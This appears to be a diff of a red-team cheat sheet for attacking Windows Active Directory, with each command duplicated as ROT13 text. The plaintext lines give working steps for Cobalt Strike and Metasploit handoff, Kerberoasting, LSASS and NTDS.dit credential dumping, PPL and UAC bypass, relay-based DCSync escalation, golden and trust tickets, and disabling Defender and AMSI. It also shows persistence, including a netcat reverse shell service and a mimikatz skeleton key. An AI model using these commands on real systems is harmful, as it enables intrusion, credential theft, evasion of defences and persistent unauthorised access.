+    zfs: frg ycbeg pbonyg yvfgrare (abezny uggcf yvfgrare)
+    zfs: frg cercraqzvtengr gehr
+    zfs: frg qvfnoyrcnlybnqunaqyre gehr
+    zfs: rkcybvg
     
-  Connect Cobalt to Metasploit
-    cobalt: create foreign https listener
-    msf: use multi/handler
-    msf: set payload windows/meterpreter/reverse_https
-    msf: set ExitOnSesssion False
-    msf: exploit -j
-    cobalt: spawn x86 foreign-https
+  Pbaarpg Pbonyg gb Zrgnfcybvg
+    pbonyg: perngr sbervta uggcf yvfgrare
+    zfs: hfr zhygv/unaqyre
+    zfs: frg cnlybnq jvaqbjf/zrgrecergre/erirefr_uggcf
+    zfs: frg RkvgBaFrfffvba Snyfr
+    zfs: rkcybvg -w
+    pbonyg: fcnja k86 sbervta-uggcf
     
-  Post Exploit Find Metasploit Exploits (like Watson)
-    * Note: Jon's tool Ghost works great for AV bypass (if errors then run: sudo gem install metasm)
-    use post/multi/recon/local_exploit_suggester
+  Cbfg Rkcybvg Svaq Zrgnfcybvg Rkcybvgf (yvxr Jngfba)
+    * Abgr: Wba'f gbby Tubfg jbexf terng sbe NI olcnff (vs reebef gura eha: fhqb trz vafgnyy zrgnfz)
+    hfr cbfg/zhygv/erpba/ybpny_rkcybvg_fhttrfgre
 
-Inveigh
-  Import Inveigh Powershell Script
-  Invoke-Inveigh -LLMNR Y -NBNS Y -DNS N -HTTP N -StatusOutput Y -ConsoleOutput Y -ConsoleStatus 1
-    - prints PW results every 1 minute
-  Invoke-Inveigh -ConsoleOutput N -RunTime 30 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y
-  * Agressor script: https://github.com/Und3rf10w/Aggressor-scripts
+Vairvtu
+  Vzcbeg Vairvtu Cbjrefuryy Fpevcg
+  Vaibxr-Vairvtu -YYZAE L -AOAF L -QAF A -UGGC A -FgnghfBhgchg L -PbafbyrBhgchg L -PbafbyrFgnghf 1
+    - cevagf CJ erfhygf rirel 1 zvahgr
+  Vaibxr-Vairvtu -PbafbyrBhgchg A -EhaGvzr 30 -Gbby 2 -YYZAE L -AOAF L -FgnghfBhgchg L
+  * Nterffbe fpevcg: uggcf://tvguho.pbz/Haq3es10j/Ntterffbe-fpevcgf
   
-Socks Proxy Trick
-    Start CS Socks -> ssh -tt -v -L 9050:localhost:<CS Socks Port> user@10.10.10.10
+Fbpxf Cebkl Gevpx
+    Fgneg PF Fbpxf -> ffu -gg -i -Y 9050:ybpnyubfg:<PF Fbpxf Cbeg> hfre@10.10.10.10
   
-Kerberos Info:
-    TGTDelg: Request another user's service ticket using any user account and impersonate that user
-        Rubues: tgtdelg           Impacket: getST.py           (Need to be authenticated)
-    ASREP Roast: Get hash for a user with "Do not require kerberos preauth" set
-        Rubues: asreproast        Impacket: GetNPUsers.py      (Do not need to be authenticated)
-    Kerberoast: Get the hash of an account with a SPN Set to crack   
-        Rubeus: kerberoast        Impacket: GetUserSPNs.py     (Need to be authenticated)
+Xreorebf Vasb:
+    GTGQryt: Erdhrfg nabgure hfre'f freivpr gvpxrg hfvat nal hfre nppbhag naq vzcrefbangr gung hfre
+        Ehohrf: gtgqryt           Vzcnpxrg: trgFG.cl           (Arrq gb or nhguragvpngrq)
+    NFERC Ebnfg: Trg unfu sbe n hfre jvgu "Qb abg erdhver xreorebf cernhgu" frg
+        Ehohrf: nfercebnfg        Vzcnpxrg: TrgACHfref.cl      (Qb abg arrq gb or nhguragvpngrq)
+    Xreorebnfg: Trg gur unfu bs na nppbhag jvgu n FCA Frg gb penpx   
+        Ehorhf: xreorebnfg        Vzcnpxrg: TrgHfreFCAf.cl     (Arrq gb or nhguragvpngrq)
    
-PrivEsc
-  Kerberoast (Request SPN and get the TGS for offline cracking)
-    Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
-      Hashcat -a0 -w3 -m 13100 /path/to/hashes /path/to/dictionary [-r rules file]
-    -OR-
-    SharpView.exe Invoke-Kerberoast (optional: -Domain:dom.fqdn -Server:DC.fqdn)
-    Rubeus.exe /tgtdeleg /user:sqlservice (<-SamAccountName)
+CeviRfp
+  Xreorebnfg (Erdhrfg FCA naq trg gur GTF sbe bssyvar penpxvat)
+    Ehorhf.rkr xrorebnfg nfercebnfg /sbezng:unfupng /bhgsvyr:unfurf.gk
+      Unfupng -n0 -j3 -z 13100 /cngu/gb/unfurf /cngu/gb/qvpgvbanel [-e ehyrf svyr]
+    -BE-
+    FunecIvrj.rkr Vaibxr-Xreorebnfg (bcgvbany: -Qbznva:qbz.sdqa -Freire:QP.sdqa)
+    Ehorhf.rkr /gtgqryrt /hfre:fdyfreivpr (<-FnzNppbhagAnzr)
 
-  MiniDump - Offline PW dump
-    SharpDump.exe
-        Download debugXX.bin
-        Move to offline system; rename to debugXX.gz -> decompress
-        minikatz "sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords" (must be on same Arch)
-    Dumpert: https://github.com/outflanknl/Dumpert (Should avoid AV and EDR)
+  ZvavQhzc - Bssyvar CJ qhzc
+    FunecQhzc.rkr
+        Qbjaybnq qrohtKK.ova
+        Zbir gb bssyvar flfgrz; eranzr gb qrohtKK.tm -> qrpbzcerff
+        zvavxngm "frxheyfn::zvavqhzc yfnff_612.qzc" "frxheyfn::ybtbaCnffjbeqf" (zhfg or ba fnzr Nepu)
+    Qhzcreg: uggcf://tvguho.pbz/bhgsynaxay/Qhzcreg (Fubhyq nibvq NI naq RQE)
     
-  Check for Protected LSASS (Reboot required if changing values)
-    shell reg query "hklm\system\currentcontrolset\control\lsa" 
-      LSA Protection: RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
-      Credential Guard: LsaCfgFlagsDefault (Windows Defender Credential Guard with UEFI lock, set it to 2 to enable Windows Defender Credential Guard without lock, and set it to 0 to disable it.)
+  Purpx sbe Cebgrpgrq YFNFF (Erobbg erdhverq vs punatvat inyhrf)
+    furyy ert dhrel "uxyz\flfgrz\pheeragpbagebyfrg\pbageby\yfn" 
+      YFN Cebgrpgvba: EhaNfCCY (0k1 = Cebgrpgrq; Erobbg erdhverq vs punatrq gb 0)
+      Perqragvny Thneq: YfnPstSyntfQrsnhyg (Jvaqbjf Qrsraqre Perqragvny Thneq jvgu HRSV ybpx, frg vg gb 2 gb ranoyr Jvaqbjf Qrsraqre Perqragvny Thneq jvgubhg ybpx, naq frg vg gb 0 gb qvfnoyr vg.)
   
-  Bypass Protected LSASS (may not work)
-    Execute: PPLKiller /installDriver (loads RTCore64.sys driver)
-    Execute: PPLKiller /makeSYSTEMcmd (Gets SYSTEM shell)
-    Execute: PPLKiller /uninstallDriver (removes driver)
+  Olcnff Cebgrpgrq YFNFF (znl abg jbex)
+    Rkrphgr: CCYXvyyre /vafgnyyQevire (ybnqf EGPber64.flf qevire)
+    Rkrphgr: CCYXvyyre /znxrFLFGRZpzq (Trgf FLFGRZ furyy)
+    Rkrphgr: CCYXvyyre /havafgnyyQevire (erzbirf qevire)
   
-  Mimikatz
-    lsadump::secrets (Only SYSTEM can read)
-      Clear Text Passwords from Registry: HKEY_LOCAL_MACHINE/Security/Policy/Secrets
+  Zvzvxngm
+    yfnqhzc::frpergf (Bayl FLFGRZ pna ernq)
+      Pyrne Grkg Cnffjbeqf sebz Ertvfgel: UXRL_YBPNY_ZNPUVAR/Frphevgl/Cbyvpl/Frpergf
   
-  Dump DC NTDS.dit
-    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
-    /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
-    crackmapexec can dump NTDS.dit
+  Qhzc QP AGQF.qvg
+    cbjrefuryy "agqfhgvy.rkr 'np v agqf' 'vsz' 'perngr shyy p:\grzc' d d"
+    /hfe/ova/vzcnpxrg-frpergfqhzc -flfgrz FLFGRZ -frphevgl FRPHEVGL -agqf agqf.qvg ybpny
+    penpxzncrkrp pna qhzc AGQF.qvg
     
-  Printer Bug (Get DC TGT from Unconstrained Delegation machine)
-      Must exploit a system running Unconstrained Delegation (UD)
-      Rubeus monitor /interval:1 (monitors for TGT when spoolsample is run)
-      Spoolsample.exe \\DC01.FQDN \\UnConstrainedDelegation.FQDN
-      Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIB... (should not have valid TGT in memory)
+  Cevagre Oht (Trg QP GTG sebz Hapbafgenvarq Qryrtngvba znpuvar)
+      Zhfg rkcybvg n flfgrz ehaavat Hapbafgenvarq Qryrtngvba (HQ)
+      Ehorhf zbavgbe /vagreiny:1 (zbavgbef sbe GTG jura fcbbyfnzcyr vf eha)
+      Fcbbyfnzcyr.rkr \\QP01.SDQA \\HaPbafgenvarqQryrtngvba.SDQA
+      Ehorhf.rkr cgg /gvpxrg:qbVR+QPPOCFtNjVO... (fubhyq abg unir inyvq GTG va zrzbel)
 
-  Schedule Tasks/Trusted Installer
-    https://tyranidslair.blogspot.com/2019/09/the-art-of-becoming-trustedinstaller.html?m=1
-      $a = New-ScheduledTaskAction -Execute notepad.exe
-      Register-ScheduledTask -TaskName 'TestTask' -Action $a
-      $svc = New-Object -ComObject 'Schedule.Service'
-      $svc.Connect()
-      $user = 'NT SERVICE\TrustedInstaller'
-      $folder = $svc.GetFolder('\')
-      $task = $folder.GetTask('TestTask')
-      $task.RunEx($null, 0, 0, $user)
+  Fpurqhyr Gnfxf/Gehfgrq Vafgnyyre
+    uggcf://glenavqfynve.oybtfcbg.pbz/2019/09/gur-neg-bs-orpbzvat-gehfgrqvafgnyyre.ugzy?z=1
+      $n = Arj-FpurqhyrqGnfxNpgvba -Rkrphgr abgrcnq.rkr
+      Ertvfgre-FpurqhyrqGnfx -GnfxAnzr 'GrfgGnfx' -Npgvba $n
+      $fip = Arj-Bowrpg -PbzBowrpg 'Fpurqhyr.Freivpr'
+      $fip.Pbaarpg()
+      $hfre = 'AG FREIVPR\GehfgrqVafgnyyre'
+      $sbyqre = $fip.TrgSbyqre('\')
+      $gnfx = $sbyqre.TrgGnfx('GrfgGnfx')
+      $gnfx.EhaRk($ahyy, 0, 0, $hfre)
       
-  PowerPriv - Get DCSync rights from any user with a mailbox
-    Link: http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
-    Download Poweshell PS1: https://github.com/G0ldenGunSec/PowerPriv
-    Compromised Beacon: Powershell-Import /path/powerPriv.ps1
-    Compromised Beacon: socks 36529
-    Compromised Beacon: rportfwd 80 127.0.0.1 80 (or rportfwd 80 127.0.0.1 8080)
-    Kali: Verify /etc/proxychains.conf port matches socks above
-    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (--http-port 8080)
-    Compromised Beacon: powershell PowerPriv -targetHost Exchange_IP -attackerHost Beacon_IP (may be internal IP)
-    dcsync fqdn dom\user
+  CbjreCevi - Trg QPFlap evtugf sebz nal hfre jvgu n znvyobk
+    Yvax: uggc://oybt.erqkbeoyhr.pbz/2019/01/erq-grnzvat-znqr-rnfl-jvgu-rkpunatr.ugzy
+    Qbjaybnq Cbjrfuryy CF1: uggcf://tvguho.pbz/T0yqraThaFrp/CbjreCevi
+    Pbzcebzvfrq Ornpba: Cbjrefuryy-Vzcbeg /cngu/cbjreCevi.cf1
+    Pbzcebzvfrq Ornpba: fbpxf 36529
+    Pbzcebzvfrq Ornpba: ecbegsjq 80 127.0.0.1 80 (be ecbegsjq 80 127.0.0.1 8080)
+    Xnyv: Irevsl /rgp/cebklpunvaf.pbas cbeg zngpurf fbpxf nobir
+    Xnyv: cebklpunvaf agyzerynlk -g yqnc://QP_VC --rfpnyngr-hfre hfreanzr (--uggc-cbeg 8080)
+    Pbzcebzvfrq Ornpba: cbjrefuryy CbjreCevi -gnetrgUbfg Rkpunatr_VC -nggnpxreUbfg Ornpba_VC (znl or vagreany VC)
+    qpflap sdqa qbz\hfre
    
-  PrivExchange - Get DCSync rights from any user with a mailbox
-    https://github.com/dirkjanm/privexchange
-    ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
-    ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
-    python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
+  CeviRkpunatr - Trg QPFlap evtugf sebz nal hfre jvgu n znvyobk
+    uggcf://tvguho.pbz/qvexwnaz/cevirkpunatr
+    ## Zbqvsl gur uggnggnpx.cl fpevcg naq punatr "nggnpxre_hey = 'uggc://qri.grfgfrtzrag.ybpny/zlnggnpxrehey/'" gb gur hey bs gur nggnpx obk ehaavat agykerynlk 
+    agyzerynlk.cl -g yqnc://sdqa.qbznva_pbagebyyre --rfpnyngr-hfre <qbznva_hfre_anzr>
+    clguba cevirkpunatr.cl -nu <agyzerynl-hey-cngu> <sdqa.rkpu-freire> -h <qbznva_hfre_anzr> -q <sdqa.qbznva-anzr>
     
-  Multi-Domain (Forrest) compromise usiing Sid History
-    Trust Commands
-      nltest /domain_trusts (view domain trusts)
-      Get-DomainTrust (view domain trust permissions)
-    SID History (Child -> Parent)
-      Add Enterprise Admin to the SID history of a user to gain access to the forrest root
-        https://adsecurity.org/?p=1640
-      mimikatz kerberos::golden </admin:Administrator|/user:DC_compname$> /domain:domain.fqdn /sid:current_domain_sid /sids:parent_domain_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
-    Spool Sample (Forest -> Forest / Domain -> Domain)
-      Force a DC in another forrest to send its TGT to you and extract it to run DCSync
-        https://www.youtube.com/watch?v=NNoQGA9G7BU
-        https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
-      SpoolSample_v4.5_x64.exe DC01.forrestA DC02.forrestB (forrest A is the target domain and returns its Computer hash)
-      Rubeus monitor /interval:5 /filteruser:DC01$
-        - Copy Kerberose ticket and put into single line. Verify ticket with Rubeus describe /ticket:5hsR4s....
-      Rubeus ptt /ticket:5hsR4s.... (This injects the ticket into the LSA)
-      DCSync DC01.forrestA
-    Trust Tickets (Forest -> Forest / Domain -> Domain)
-        https://adsecurity.org/?p=1588
-        https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/
-      GET Trusts Hash
-      hashdump and look for account ending in $ which is not a computer account. This is the trust password. (Changes every 30 days)
-      dcsync current_domain_fqdn current_dom\target_domain$ (example: dcsync admin.offshore.com admin\client$)
-      External Trusts
-        mimikatz kerberos::golden /domain:domain.fqdn /sid:current_domain_sid /rc4:NTLM_Trust_Hash /user:Administrator /service:krbtgt /target:target_domain_fqdn /ticket:file.kirbi
-          - Save file.kirbi -> used for next command to get TGS in target domain
-        mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
-      Internal Trusts
-        mimikatz lsadump::trust /patch
-        mimikatz kerberos::golden /domain:domain.fqdn /sid:current_domain_sid /sids:target_domain_sid-519 /rc4:NTLM_Trust_Hash /user:Administrator /service:krbtgt  /target:target_domain_fqdn /ticket:file.kirbi
-        mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
-        mimikatz kirbikator lsa file.kirbi
+  Zhygv-Qbznva (Sbeerfg) pbzcebzvfr hfvvat Fvq Uvfgbel
+    Gehfg Pbzznaqf
+      aygrfg /qbznva_gehfgf (ivrj qbznva gehfgf)
+      Trg-QbznvaGehfg (ivrj qbznva gehfg crezvffvbaf)
+    FVQ Uvfgbel (Puvyq -> Cnerag)
+      Nqq Ragrecevfr Nqzva gb gur FVQ uvfgbel bs n hfre gb tnva npprff gb gur sbeerfg ebbg
+        uggcf://nqfrphevgl.bet/?c=1640
+      zvzvxngm xreorebf::tbyqra </nqzva:Nqzvavfgengbe|/hfre:QP_pbzcanzr$> /qbznva:qbznva.sdqa /fvq:pheerag_qbznva_fvq /fvqf:cnerag_qbznva_Fvq..-519 /xeogtg:xeogtg_unfu /fgnegbssfrg:0 /raqva:600 /erarjznk:10080 /cgg
+    Fcbby Fnzcyr (Sberfg -> Sberfg / Qbznva -> Qbznva)
+      Sbepr n QP va nabgure sbeerfg gb fraq vgf GTG gb lbh naq rkgenpg vg gb eha QPFlap
+        uggcf://jjj.lbhghor.pbz/jngpu?i=AAbDTN9T7OH
+        uggcf://jjj.unezw0l.arg/oybt/erqgrnzvat/abg-n-frphevgl-obhaqnel-oernxvat-sberfg-gehfgf/
+      FcbbyFnzcyr_i4.5_k64.rkr QP01.sbeerfgN QP02.sbeerfgO (sbeerfg N vf gur gnetrg qbznva naq ergheaf vgf Pbzchgre unfu)
+      Ehorhf zbavgbe /vagreiny:5 /svygrehfre:QP01$
+        - Pbcl Xreorebfr gvpxrg naq chg vagb fvatyr yvar. Irevsl gvpxrg jvgu Ehorhf qrfpevor /gvpxrg:5ufE4f....
+      Ehorhf cgg /gvpxrg:5ufE4f.... (Guvf vawrpgf gur gvpxrg vagb gur YFN)
+      QPFlap QP01.sbeerfgN
+    Gehfg Gvpxrgf (Sberfg -> Sberfg / Qbznva -> Qbznva)
+        uggcf://nqfrphevgl.bet/?c=1588
+        uggcf://jjj.unezw0l.arg/oybt/erqgrnzvat/sebz-xrxrb-gb-ehorhf/
+      TRG Gehfgf Unfu
+      unfuqhzc naq ybbx sbe nppbhag raqvat va $ juvpu vf abg n pbzchgre nppbhag. Guvf vf gur gehfg cnffjbeq. (Punatrf rirel 30 qnlf)
+      qpflap pheerag_qbznva_sdqa pheerag_qbz\gnetrg_qbznva$ (rknzcyr: qpflap nqzva.bssfuber.pbz nqzva\pyvrag$)
+      Rkgreany Gehfgf
+        zvzvxngm xreorebf::tbyqra /qbznva:qbznva.sdqa /fvq:pheerag_qbznva_fvq /ep4:AGYZ_Gehfg_Unfu /hfre:Nqzvavfgengbe /freivpr:xeogtg /gnetrg:gnetrg_qbznva_sdqa /gvpxrg:svyr.xveov
+          - Fnir svyr.xveov -> hfrq sbe arkg pbzznaq gb trg GTF va gnetrg qbznva
+        zvzvxngm nfxgtf P:\cngu\svyr.xveov pvsf/qp01.gnetrg.qbznva
+      Vagreany Gehfgf
+        zvzvxngm yfnqhzc::gehfg /cngpu
+        zvzvxngm xreorebf::tbyqra /qbznva:qbznva.sdqa /fvq:pheerag_qbznva_fvq /fvqf:gnetrg_qbznva_fvq-519 /ep4:AGYZ_Gehfg_Unfu /hfre:Nqzvavfgengbe /freivpr:xeogtg  /gnetrg:gnetrg_qbznva_sdqa /gvpxrg:svyr.xveov
+        zvzvxngm nfxgtf P:\cngu\svyr.xveov pvsf/qp01.gnetrg.qbznva
+        zvzvxngm xveovxngbe yfn svyr.xveov
     
-Bypass UAC
-  C# Code: https://github.com/juliourena/plaintext/tree/master/CSharp%20Tools/UAC%20Bypass
-  Upload payload to target
-  execute-assembly /opt/tools/CSharp_Tools/Compiled/uac_bypass_silentcleanup.exe C:\Users\username\AppData\Local\Temp\smb-x64.exe
+Olcnff HNP
+  P# Pbqr: uggcf://tvguho.pbz/whyvbheran/cynvagrkg/gerr/znfgre/PFunec%20Gbbyf/HNP%20Olcnff
+  Hcybnq cnlybnq gb gnetrg
+  rkrphgr-nffrzoyl /bcg/gbbyf/PFunec_Gbbyf/Pbzcvyrq/hnp_olcnff_fvyragpyrnahc.rkr P:\Hfref\hfreanzr\NccQngn\Ybpny\Grzc\fzo-k64.rkr
     
-Persistance
-  StayKit
-    Service:
-      Name=MyService
-      Command=C:\Windows\Temp\myservice.exe
-      Drop Location=Command=C:\Windows\Temp\myservice.exe
-      Listener: https
-      Custom File: /root/beacons/beacon-svc.exe
-  Scheduled Tasks:
-    Same as above, but time must be 11:30 format and repitition is 5 (ie PT5H) so run every 5 hours.
-    * Path Example: Task= Microsoft\Windows\SyncCenter\MyTaskName
+Crefvfgnapr
+  FgnlXvg
+    Freivpr:
+      Anzr=ZlFreivpr
+      Pbzznaq=P:\Jvaqbjf\Grzc\zlfreivpr.rkr
+      Qebc Ybpngvba=Pbzznaq=P:\Jvaqbjf\Grzc\zlfreivpr.rkr
+      Yvfgrare: uggcf
+      Phfgbz Svyr: /ebbg/ornpbaf/ornpba-fip.rkr
+  Fpurqhyrq Gnfxf:
+    Fnzr nf nobir, ohg gvzr zhfg or 11:30 sbezng naq ercvgvgvba vf 5 (vr CG5U) fb eha rirel 5 ubhef.
+    * Cngu Rknzcyr: Gnfx= Zvpebfbsg\Jvaqbjf\FlapPragre\ZlGnfxAnzr
 
-  shell sc create MyService binpath= c:\windows\temp\https-local-svc-x64.exe start= auto
+  furyy fp perngr ZlFreivpr ovacngu= p:\jvaqbjf\grzc\uggcf-ybpny-fip-k64.rkr fgneg= nhgb
   
-  schtasks /create /f /sc minute /mo 1 /tn "Microsoft\Windows\WwanSvc\WUpdater" /ru "SYSTEM" /tr "cmd.exe /C tasklist | findstr.exe gpupdater.exe || start c:\windows\system32\gpupdater.exe"
-    Runs every 1 minute to see if gpupdater.exe process is not running and restart it if not
-  sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
-    sc start evilsvc
-  sc \\myserver create NewService binpath= c:\windows\system32\NewServ.exe
-  reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1 /d "C:\temp\evil.exe|dll"
+  fpugnfxf /perngr /s /fp zvahgr /zb 1 /ga "Zvpebfbsg\Jvaqbjf\JjnaFip\JHcqngre" /eh "FLFGRZ" /ge "pzq.rkr /P gnfxyvfg | svaqfge.rkr tchcqngre.rkr || fgneg p:\jvaqbjf\flfgrz32\tchcqngre.rkr"
+    Ehaf rirel 1 zvahgr gb frr vs tchcqngre.rkr cebprff vf abg ehaavat naq erfgneg vg vs abg
+  fp perngr rivyfip ovacngu= "p:\gbbyf\ap 10.0.0.5 443 -r pzq.rkr" fgneg= "nhgb" bow= "YbpnyFlfgrz" cnffjbeq= ""
+    fp fgneg rivyfip
+  fp \\zlfreire perngr ArjFreivpr ovacngu= p:\jvaqbjf\flfgrz32\ArjFrei.rkr
+  ert nqq UXRL_YBPNY_ZNPUVAR\Fbsgjner\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Eha /i 1 /q "P:\grzc\rivy.rkr|qyy"
 
-  # Mimikatz Skeleton Key (default master password is mimikatz)
-    mimikatz misc::skeleton
-      - Once done; make_token dom\username mimikatz
+  # Zvzvxngm Fxryrgba Xrl (qrsnhyg znfgre cnffjbeq vf zvzvxngm)
+    zvzvxngm zvfp::fxryrgba
+      - Bapr qbar; znxr_gbxra qbz\hfreanzr zvzvxngm
   
-Windows Commands
-  Secure Delete
-    cipher /w:C:\path-to-directory
+Jvaqbjf Pbzznaqf
+  Frpher Qryrgr
+    pvcure /j:P:\cngu-gb-qverpgbel
     
-  runas /netonly /user:[username] powershell.exe
-    wmic.exe /node:[dst-ip] process call create "powershelle.exe whoami"
-    psexec.exe \\IP-Addr -i -s cmd.exe (-s runs as System)
+  ehanf /argbayl /hfre:[hfreanzr] cbjrefuryy.rkr
+    jzvp.rkr /abqr:[qfg-vc] cebprff pnyy perngr "cbjrefuryyr.rkr jubnzv"
+    cfrkrp.rkr \\VC-Nqqe -v -f pzq.rkr (-f ehaf nf Flfgrz)
 
-  Disable/Enable UAC Command Line
-      Disable: reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
-      Enable:  reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
+  Qvfnoyr/Ranoyr HNP Pbzznaq Yvar
+      Qvfnoyr: ert.rkr NQQ UXYZ\FBSGJNER\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Cbyvpvrf\Flfgrz /i RanoyrYHN /g ERT_QJBEQ /q 0 /s
+      Ranoyr:  ert.rkr NQQ UXYZ\FBSGJNER\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Cbyvpvrf\Flfgrz /i RanoyrYHN /g ERT_QJBEQ /q 1 /s
 
-  Modify Defender
-    https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=win10-ps
-      Powershell Set-MpPreference -DisableRealtimeMonitoring $true ($false turns it on)
-      Powershell Add-MpPreference -ExclusionPath "C:\Temp" (Excludes a folder)
-      Powershell Set-MpPreference -DisableScriptScanning 1 (Disable AMSI; set to 0 to enable)
-        Example: impacket-wmiexec Administrator:'password'@10.10.10.10 "Powershell.exe .('{3}{2}{4}{1}{0}'-f 'e','nc','Prefe','Set-Mp','re') -DisableScriptScanning 1"
+  Zbqvsl Qrsraqre
+    uggcf://qbpf.zvpebfbsg.pbz/ra-hf/cbjrefuryy/zbqhyr/qrsraqre/frg-zccersrerapr?ivrj=jva10-cf
+      Cbjrefuryy Frg-ZcCersrerapr -QvfnoyrErnygvzrZbavgbevat $gehr ($snyfr gheaf vg ba)
+      Cbjrefuryy Nqq-ZcCersrerapr -RkpyhfvbaCngu "P:\Grzc" (Rkpyhqrf n sbyqre)
+      Cbjrefuryy Frg-ZcCersrerapr -QvfnoyrFpevcgFpnaavat 1 (Qvfnoyr NZFV; frg gb 0 gb ranoyr)
+        Rknzcyr: vzcnpxrg-jzvrkrp Nqzvavfgengbe:'cnffjbeq'@10.10.10.10 "Cbjrefuryy.rkr .('{3}{2}{4}{1}{0}'-s 'r','ap','Cersr','Frg-Zc','er') -QvfnoyrFpevcgFpnaavat 1"
       
-  Opens Powershell as Administrator
-      Start-Process PowerShell -Verb RunAs
+  Bcraf Cbjrefuryy nf Nqzvavfgengbe
+      Fgneg-Cebprff CbjreFuryy -Ireo EhaNf
 
-  Procdump (lsass.exe)
-      procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
-      mimikatz.exe (Copied from Kali to Windows)
-          sekurlsa::minidump C:\Windows\Temp\lsass.dmp
-          sekurlsa::LogonPasswords
+  Cebpqhzc (yfnff.rkr)
+      cebpqhzc.rkr -zn yfnff.rkr P:\Jvaqbjf\Grzc\yfnff.qzc
+      zvzvxngm.rkr (Pbcvrq sebz Xnyv gb Jvaqbjf)
+          frxheyfn::zvavqhzc P:\Jvaqbjf\Grzc\yfnff.qzc
+          frxheyfn::YbtbaCnffjbeqf
 
-  Set User Password
-      Domain: $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; Set-DomainUserPassword -Identity [username] -AccountPassword $newpwd
-      PSCredential: $username = 'domain\username'; $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; $MyCreds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$newpwd
-          gwmi win32_service -credential $MyCreds -computer 192.168.5.17
+  Frg Hfre Cnffjbeq
+      Qbznva: $arjcjq = PbairegGb-FrpherFgevat -Fgevat "Cnffjbeq1!" -NfCynvaGrkg –Sbepr; Frg-QbznvaHfreCnffjbeq -Vqragvgl [hfreanzr] -NppbhagCnffjbeq $arjcjq
+      CFPerqragvny: $hfreanzr = 'qbznva\hfreanzr'; $arjcjq = PbairegGb-FrpherFgevat -Fgevat "Cnffjbeq1!" -NfCynvaGrkg –Sbepr; $ZlPerqf = Arj-Bowrpg -GlcrAnzr Flfgrz.Znantrzrag.Nhgbzngvba.CFPerqragvny -NethzragYvfg $hfreanzr,$arjcjq
+          tjzv jva32_freivpr -perqragvny $ZlPerqf -pbzchgre 192.168.5.17
   
-  Powershell Search
-    Find files with passwords in contencts of TXT and LOG Files
-      ls -r -d 2 -i *.txt,*.log c:\path | sls -patt 'pass' | select Line, Path (or Out-File ./file.txt)
-    Files last write time in the last 30 days.
-      ls -r -d 2 -i *pass* c:\path | ? {$_.LastWriteTime -lt (Get-Date).AddDays(-30)} | select LastWriteTime, FullName | epcsv -NotypeInformation ./test.csv
-    Powershell Console Logs
-      gc "C:\Users\<username>\Application Data\microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
-    Powershell Zip Compress
-      Compress-Archive -Path C:\path\file -DestinationPath C:\path\file.zip
+  Cbjrefuryy Frnepu
+    Svaq svyrf jvgu cnffjbeqf va pbagrapgf bs GKG naq YBT Svyrf
+      yf -e -q 2 -v *.gkg,*.ybt p:\cngu | fyf -cngg 'cnff' | fryrpg Yvar, Cngu (be Bhg-Svyr ./svyr.gkg)
+    Svyrf ynfg jevgr gvzr va gur ynfg 30 qnlf.
+      yf -e -q 2 -v *cnff* p:\cngu | ? {$_.YnfgJevgrGvzr -yg (Trg-Qngr).NqqQnlf(-30)} | fryrpg YnfgJevgrGvzr, ShyyAnzr | rcpfi -AbglcrVasbezngvba ./grfg.pfi
+    Cbjrefuryy Pbafbyr Ybtf
+      tp "P:\Hfref\<hfreanzr>\Nccyvpngvba Qngn\zvpebfbsg\Jvaqbjf\CbjreFuryy\CFErnqyvar\PbafbyrUbfg_uvfgbel.gkg"
+    Cbjrefuryy Mvc Pbzcerff
+      Pbzcerff-Nepuvir -Cngu P:\cngu\svyr -QrfgvangvbaCngu P:\cngu\svyr.mvc
       
-Windows Port Forwarding
-Port Forward
-    Show Proxy: netsh interface portproxy show all
-    Set PortForward: netsh interface portproxy add v4tov4 listenport=8443 listenaddress=10.10.14.3 connectport=443 connectaddress=10.10.5.13
-    Reset Proxy: netsh interface portproxy reset
+Jvaqbjf Cbeg Sbejneqvat
+Cbeg Sbejneq
+    Fubj Cebkl: argfu vagresnpr cbegcebkl fubj nyy
+    Frg CbegSbejneq: argfu vagresnpr cbegcebkl nqq i4gbi4 yvfgracbeg=8443 yvfgranqqerff=10.10.14.3 pbaarpgcbeg=443 pbaarpgnqqerff=10.10.5.13
+    Erfrg Cebkl: argfu vagresnpr cbegcebkl erfrg
     
-Windows proxy through Kali VPN
-    Windows: Set Static IP on Windows and set GW to Kali IP
-    Kali: Set IPv4 Forwarding
